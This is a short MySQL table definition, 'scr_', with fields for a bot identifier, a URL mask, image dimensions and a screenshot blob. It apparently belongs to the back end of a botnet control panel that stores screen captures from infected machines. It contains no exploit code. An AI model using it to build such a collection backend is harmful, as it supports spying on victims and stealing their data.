CREATE TABLE IF NOT EXISTS `scr_` ( 
  `id` int(10) unsigned NOT NULL auto_increment, 
  `date_rep` datetime NOT NULL, 
  `bot_guid` varchar(40) NOT NULL, 
  `urlmask` varchar(1000) NOT NULL, 
  `w` smallint(5) unsigned NOT NULL, 
  `h` smallint(5) unsigned NOT NULL, 
  `ticktime` int(10) unsigned NOT NULL, 
  `img` longblob NOT NULL, 
  PRIMARY KEY  (`id`) 
) ENGINE=MyISAM  DEFAULT CHARSET=latin1 ;
